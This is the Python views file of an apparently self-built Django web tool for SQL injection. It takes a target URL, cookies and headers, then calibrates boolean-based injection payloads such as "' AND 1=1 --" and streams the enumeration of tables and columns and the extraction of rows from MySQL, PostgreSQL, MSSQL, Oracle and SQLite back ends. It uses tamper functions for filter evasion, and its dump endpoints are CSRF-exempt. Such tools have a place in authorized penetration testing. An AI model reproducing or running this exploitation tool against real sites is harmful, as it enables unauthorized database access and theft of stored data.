# views.py - FIXED: Support all 5 databases (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
import json
import threading
import queue
import time
from collections import Counter
from django.shortcuts import render
from django.http import StreamingHttpResponse, HttpResponseBadRequest
from django.views.decorators.csrf import csrf_exempt

from .forms import ScanForm
from .scan import run_scan
from . import scan as scanmod


# ===== Helper: Format log =====
def fmt_header(title):
    sep = "=" * 60
    return f"{sep}\n{title}\n{sep}\n"


def fmt_info(msg):
    return f"[*] {msg}\n"


def fmt_dump(msg):
    return f"[dump] {msg}\n"


def fmt_detection(detection_type, msg):
    return f"    [{detection_type}] {msg}\n"


def fmt_error(msg):
    return f"[error] {msg}\n"


def fmt_summary(msg):
    return f"\n{msg}\n"


# ===== Helper: Stream response via thread + queue =====
def stream_with_thread(target_fn, *args, **kwargs):
    q = queue.Queue()

    def logger(msg):
        q.put(str(msg))

    def runner():
        try:
            target_fn(*args, log=logger, **kwargs)
        except Exception as e:
            q.put(fmt_error(str(e)))
        finally:
            q.put(json.dumps({"__done__": True}))

    thread = threading.Thread(target=runner, daemon=True)
    thread.start()

    def stream():
        while True:
            item = q.get()
            yield item + "\n"
            try:
                j = json.loads(item)
                if j.get('__done__'):
                    break
            except Exception:
                pass

    return StreamingHttpResponse(stream(), content_type='text/plain; charset=utf-8')


# ===== View: Main Scan (index) - ALWAYS streamed =====
def index(request):
    form = ScanForm()

    if request.method == 'POST':
        # --- Collect form data ---
        target_url = request.POST.get('target_url', '').strip()
        request_method = request.POST.get('request_method', 'POST').upper()
        do_dump = request.POST.get('do_dump') == 'on'

        # Parameters
        default_params = {}
        i = 0
        while True:
            key = request.POST.get(f'param_key_{i}')
            value = request.POST.get(f'param_value_{i}')
            checked = request.POST.get(f'param_checked_{i}') == 'on'
            if key is None:
                break
            if checked and key:
                default_params[key] = value or ''
            i += 1

        # Cookies
        cookies = {}
        i = 0
        while True:
            key = request.POST.get(f'cookie_key_{i}')
            value = request.POST.get(f'cookie_value_{i}')
            if key is None:
                break
            if key:
                cookies[key] = value or ''
            i += 1

        # Headers
        headers = {}
        i = 0
        while True:
            key = request.POST.get(f'header_key_{i}')
            value = request.POST.get(f'header_value_{i}')
            if key is None:
                break
            if key:
                headers[key] = value or ''
            i += 1

        # --- Validation ---
        if not target_url:
            return HttpResponseBadRequest("Target URL is required.")
        if not default_params:
            return HttpResponseBadRequest("At least one parameter must be selected.")

        # --- Stream scan ---
        def scan_job(log):
            try:
                scan_results = run_scan(
                    target_url=target_url,
                    default_params=default_params,
                    request_method=request_method,
                    cookies=cookies,
                    headers=headers,
                    do_dump=do_dump,
                    log_func=log
                )
                log(json.dumps({"__done__": True, "results": scan_results["results"]}))
            except Exception as e:
                log(fmt_error(str(e)))
                log(json.dumps({"__done__": True, "results": None}))

        return stream_with_thread(scan_job)

    # GET: show form
    return render(request, 'scanner/index.html', {'form': form})


# ===== Helper: Calibrate true_sha for all DB types =====
def calibrate_true_sha_for_db(db_type, session, url, base_params, param_name, method, tamper_func):
    """
    Calibrate true_sha for specific database type.
    Returns the most common SHA hash for a TRUE condition.
    """
    import time
    from collections import Counter

    # Define TRUE test payload per DB
    if db_type == "MySQL":
        test_payload = tamper_func("1' AND 1=1 -- -")
    elif db_type == "PostgreSQL":
        test_payload = tamper_func("' AND 1=1 --")
    elif db_type == "MSSQL":
        test_payload = tamper_func("' AND 1=1 --")
    elif db_type == "Oracle":
        test_payload = tamper_func("' AND 1=1 --")
    elif db_type == "SQLite":
        return scanmod.calibrate_true_sha_sqlite(session, url, base_params, param_name, method, tamper_func)
    else:
        return None

    # Perform multiple requests to get stable hash
    hashes = []
    for _ in range(5):
        params = base_params.copy()
        params[param_name] = test_payload
        text, _, _ = scanmod.make_request(session, url, params, method)
        if text:
            hashes.append(scanmod.hash_text(text))
        time.sleep(0.1)

    if not hashes:
        return None

    return Counter(hashes).most_common(1)[0][0]


# ===== View: Dump Tables (streamed) - FIXED FOR ALL 5 DATABASES =====
@csrf_exempt
def dump_tables(request):
    if request.method == 'GET':
        ctx = {
            'target_url': request.GET.get('target_url', ''),
            'default_params': request.GET.get('default_params', '{}'),
            'request_method': request.GET.get('request_method', 'POST'),
            'param_name': request.GET.get('param_name', ''),
            'tamper': request.GET.get('tamper', 'none'),
            'db_type': request.GET.get('db_type', 'MySQL'),
            'method': request.GET.get('method', 'boolean'),
            'cookies': request.GET.get('cookies', '{}'),
            'headers': request.GET.get('headers', '{}'),
            'true_sha': request.GET.get('true_sha', ''),
        }
        return render(request, 'scanner/dump_tables.html', ctx)

    # POST: start dump
    try:
        target_url = request.POST['target_url']
        default_params = json.loads(request.POST.get('default_params', '{}'))
        request_method = request.POST.get('request_method', 'POST')
        param_name = request.POST['param_name']
        tamper_name = request.POST.get('tamper', 'none')
        db_type = request.POST.get('db_type', 'MySQL')
        dump_method = request.POST.get('method', 'boolean')
        cookies = json.loads(request.POST.get('cookies', '{}'))
        headers = json.loads(request.POST.get('headers', '{}'))
        true_sha = request.POST.get('true_sha', '')
    except Exception as e:
        return HttpResponseBadRequest(f'Invalid input: {e}')

    def job(log):
        import time
        session = scanmod.requests.Session()
        session.headers.update(headers)
        session.cookies.update(cookies)
        method = request_method.upper()
        tamper_func = scanmod.TAMPER_FUNCTIONS.get(tamper_name, scanmod.tamper_none)

        tables = []

        try:
            log(fmt_dump(f"=== DUMPING TABLES ==="))
            log(fmt_dump(f"Database Type: {db_type}"))
            log(fmt_dump(f"Parameter: {param_name}"))
            log(fmt_dump(f"Method: {dump_method}"))
            log(fmt_dump(f"Tamper: {tamper_name}"))
            log(fmt_dump(f"Provided SHA: {true_sha}"))

            final_true_sha = true_sha if true_sha else None

            # Calibrate true_sha if boolean-based and not provided
            if dump_method == 'boolean':
                if not final_true_sha:
                    log(fmt_dump(f"No SHA provided, calibrating for {db_type}..."))
                    final_true_sha = calibrate_true_sha_for_db(db_type, session, target_url, default_params, param_name, method, tamper_func)
                    if final_true_sha:
                        log(fmt_dump(f"Calibrated SHA: {final_true_sha}"))
                    else:
                        log(fmt_error("Failed to calibrate true_sha"))
                        return
                else:
                    log(fmt_dump(f"Re-calibrating SHA for {db_type} to ensure accuracy..."))
                    recalibrated = calibrate_true_sha_for_db(db_type, session, target_url, default_params, param_name, method, tamper_func)
                    if recalibrated:
                        final_true_sha = recalibrated
                        log(fmt_dump(f"Re-calibrated SHA: {final_true_sha}"))

                if final_true_sha:
                    log(fmt_dump(f"Starting table enumeration for {db_type}..."))
                    tables = scanmod.enumerate_tables_boolean_based(
                        db_type, session, target_url, default_params, param_name,
                        final_true_sha, method, tamper_func
                    )
            else:  # time-based
                log(fmt_dump(f"Using time-based extraction for {db_type}..."))
                tables = scanmod.enumerate_tables_time_based(
                    db_type, session, target_url, default_params, param_name, method, tamper_func
                )

            log(fmt_dump(f"Total tables found: {len(tables)}"))
            for i, t in enumerate(tables):
                log(fmt_dump(f"  [{i+1}] {t}"))

        except Exception as e:
            log(fmt_error(str(e)))
            import traceback
            log(fmt_error(traceback.format_exc()))
        finally:
            log(json.dumps({"__done__": True, "tables": tables}))

    return stream_with_thread(job)


# ===== View: Dump Columns (streamed) - FIXED FOR ALL 5 DATABASES =====
@csrf_exempt
def dump_columns(request):
    if request.method == 'GET':
        ctx = {
            'target_url': request.GET.get('target_url', ''),
            'default_params': request.GET.get('default_params', '{}'),
            'request_method': request.GET.get('request_method', 'POST'),
            'param_name': request.GET.get('param_name', ''),
            'table': request.GET.get('table', ''),
            'tamper': request.GET.get('tamper', 'none'),
            'db_type': request.GET.get('db_type', 'MySQL'),
            'method': request.GET.get('method', 'boolean'),
            'cookies': request.GET.get('cookies', '{}'),
            'headers': request.GET.get('headers', '{}'),
            'true_sha': request.GET.get('true_sha', ''),
        }
        return render(request, 'scanner/dump_columns.html', ctx)

    try:
        target_url = request.POST['target_url']
        default_params = json.loads(request.POST.get('default_params', '{}'))
        request_method = request.POST.get('request_method', 'POST')
        param_name = request.POST['param_name']
        table = request.POST['table']
        tamper_name = request.POST.get('tamper', 'none')
        db_type = request.POST.get('db_type', 'MySQL')
        dump_method = request.POST.get('method', 'boolean')
        cookies = json.loads(request.POST.get('cookies', '{}'))
        headers = json.loads(request.POST.get('headers', '{}'))
        true_sha = request.POST.get('true_sha', '')
    except Exception as e:
        return HttpResponseBadRequest(f'Invalid input: {e}')

    def job(log):
        import time
        session = scanmod.requests.Session()
        session.headers.update(headers)
        session.cookies.update(cookies)
        method = request_method.upper()
        tamper_func = scanmod.TAMPER_FUNCTIONS.get(tamper_name, scanmod.tamper_none)

        cols = []

        try:
            log(fmt_dump(f"=== DUMPING COLUMNS ==="))
            log(fmt_dump(f"Database Type: {db_type}"))
            log(fmt_dump(f"Table: {table}"))
            log(fmt_dump(f"Method: {dump_method}"))

            final_true_sha = true_sha if true_sha else None

            if dump_method == 'boolean':
                if not final_true_sha:
                    log(fmt_dump(f"Calibrating SHA for {db_type}..."))
                    final_true_sha = calibrate_true_sha_for_db(db_type, session, target_url, default_params, param_name, method, tamper_func)
                    if final_true_sha:
                        log(fmt_dump(f"Calibrated SHA: {final_true_sha}"))
                    else:
                        log(fmt_error("Failed to calibrate true_sha"))
                        return
                else:
                    log(fmt_dump(f"Re-calibrating SHA for {db_type}..."))
                    recalibrated = calibrate_true_sha_for_db(db_type, session, target_url, default_params, param_name, method, tamper_func)
                    if recalibrated:
                        final_true_sha = recalibrated

                if final_true_sha:
                    log(fmt_dump(f"Starting column enumeration for {db_type}.{table}..."))
                    cols = scanmod.enumerate_columns_boolean_based(
                        db_type, session, target_url, default_params, param_name,
                        table, final_true_sha, method, tamper_func
                    )
            else:
                log(fmt_dump(f"Using time-based extraction for {db_type}.{table}..."))
                cols = scanmod.enumerate_columns_time_based(
                    db_type, session, target_url, default_params, param_name,
                    table, method, tamper_func
                )

            log(fmt_dump(f"Total columns found: {len(cols)}"))
            for i, c in enumerate(cols):
                log(fmt_dump(f"  [{i+1}] {c}"))

        except Exception as e:
            log(fmt_error(str(e)))
            import traceback
            log(fmt_error(traceback.format_exc()))
        finally:
            log(json.dumps({"__done__": True, "columns": cols}))

    return stream_with_thread(job)


# ===== View: Dump Data (streamed) - FIXED FOR ALL 5 DATABASES WITH DEDUPLICATION =====
@csrf_exempt
def dump_data(request):
    if request.method == 'GET':
        ctx = {
            'target_url': request.GET.get('target_url', ''),
            'default_params': request.GET.get('default_params', '{}'),
            'request_method': request.GET.get('request_method', 'POST'),
            'param_name': request.GET.get('param_name', ''),
            'table': request.GET.get('table', ''),
            'columns': request.GET.get('columns', ''),
            'tamper': request.GET.get('tamper', 'none'),
            'db_type': request.GET.get('db_type', 'MySQL'),
            'method': request.GET.get('method', 'boolean'),
            'cookies': request.GET.get('cookies', '{}'),
            'headers': request.GET.get('headers', '{}'),
            'true_sha': request.GET.get('true_sha', ''),
        }
        return render(request, 'scanner/dump_data.html', ctx)

    try:
        target_url = request.POST['target_url']
        default_params = json.loads(request.POST.get('default_params', '{}'))
        request_method = request.POST.get('request_method', 'POST')
        param_name = request.POST['param_name']
        table = request.POST['table']
        columns_input = request.POST.get('columns', '')
        columns = [c.strip() for c in columns_input.split(',') if c.strip()]
        tamper_name = request.POST.get('tamper', 'none')
        db_type = request.POST.get('db_type', 'MySQL')
        dump_method = request.POST.get('method', 'boolean')
        cookies = json.loads(request.POST.get('cookies', '{}'))
        headers = json.loads(request.POST.get('headers', '{}'))
        true_sha = request.POST.get('true_sha', '')
    except Exception as e:
        return HttpResponseBadRequest(f'Invalid input: {e}')

    def job(log):
        import time
        session = scanmod.requests.Session()
        session.headers.update(headers)
        session.cookies.update(cookies)
        method = request_method.upper()
        tamper_func = scanmod.TAMPER_FUNCTIONS.get(tamper_name, scanmod.tamper_none)

        rows = []

        try:
            log(fmt_dump(f"=== DUMPING DATA ==="))
            log(fmt_dump(f"Database Type: {db_type}"))
            log(fmt_dump(f"Table: {table}"))
            log(fmt_dump(f"Columns: {columns or 'ALL'}"))
            log(fmt_dump(f"Method: {dump_method}"))

            final_true_sha = true_sha if true_sha else None
            is_time_based = dump_method != 'boolean'

            # Detect primary key
            log(fmt_dump(f"Detecting primary key for {db_type}.{table}..."))
            pk_cols = scanmod.detect_primary_key(
                db_type, table, session, target_url, default_params, param_name,
                final_true_sha, method, tamper_func, is_time_based
            )
            if pk_cols:
                log(fmt_dump(f"Primary key detected: {pk_cols}"))
            else:
                log(fmt_dump("No PK detected, using default ordering"))

            if dump_method == 'boolean':
                if not final_true_sha:
                    log(fmt_dump(f"Calibrating SHA for {db_type}..."))
                    final_true_sha = calibrate_true_sha_for_db(db_type, session, target_url, default_params, param_name, method, tamper_func)
                    if final_true_sha:
                        log(fmt_dump(f"Calibrated SHA: {final_true_sha}"))
                    else:
                        log(fmt_error("Failed to calibrate true_sha"))
                        return
                else:
                    log(fmt_dump(f"Re-calibrating SHA for {db_type}..."))
                    recalibrated = calibrate_true_sha_for_db(db_type, session, target_url, default_params, param_name, method, tamper_func)
                    if recalibrated:
                        final_true_sha = recalibrated

                if final_true_sha:
                    log(fmt_dump(f"Extracting rows from {db_type}.{table}..."))
                    rows = scanmod.extract_rows_boolean_based(
                        db_type, session, target_url, default_params, param_name,
                        table, columns, final_true_sha, method, tamper_func,
                        limit=10, pk_cols=pk_cols
                    )
            else:
                log(fmt_dump(f"Using time-based extraction for {db_type}.{table}..."))
                rows = scanmod.extract_rows_time_based(
                    db_type, session, target_url, default_params, param_name,
                    table, columns, method, tamper_func, limit=10, pk_cols=pk_cols
                )

            log(fmt_dump(f"Raw rows extracted: {len(rows)}"))

            # Deduplicate rows
            seen = set()
            unique_rows = []
            for row in rows:
                row_tuple = tuple(sorted(row.items()))
                if row_tuple not in seen:
                    seen.add(row_tuple)
                    unique_rows.append(row)

            rows = unique_rows
            log(fmt_dump(f"After deduplication: {len(rows)} unique rows"))

            for i, row in enumerate(rows):
                log(fmt_dump(f"Row {i+1}: {row}"))

        except Exception as e:
            log(fmt_error(str(e)))
            import traceback
            log(fmt_error(traceback.format_exc()))
        finally:
            log(json.dumps({"__done__": True, "rows": rows, "columns": columns}))

    return stream_with_thread(job)